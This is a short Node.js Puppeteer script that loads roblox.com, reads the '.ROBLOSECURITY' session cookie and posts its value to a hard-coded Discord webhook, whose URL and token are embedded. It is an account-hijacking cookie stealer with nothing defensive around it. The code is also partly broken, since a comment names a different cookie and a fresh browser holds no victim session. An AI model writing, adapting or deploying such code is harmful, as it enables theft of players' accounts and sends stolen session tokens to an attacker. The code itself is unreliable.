const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  const url = 'https://www.roblox.com/*';
  await page.goto(url);

  // Extract a cookie named 'myCookie'
const cookie = await page.evaluate(() => {
    const cookies = document.cookie.split(';');
    for (const cookieString of cookies) {
      const [name, value] = cookieString.trim().split('=');
      if (name === '.ROBLOSECURITY') {
        return value;
      }
    }
    return null; // Cookie not found
  });
  

  // Send the cookie data to a Discord webhook
  const discordWebhook = 'https://discord.com/api/webhooks/1154059676795814011/pGIFX0rdpkJiDI3e6NE4VxFPxtvwJs5-UUF34CzHnqjceWok4EeHkodSF29ACWEbzHx8';
  const fetch = require('node-fetch');
  await fetch(discordWebhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: `Cookie: ${cookie}` }),
  });

  await browser.close();
})();
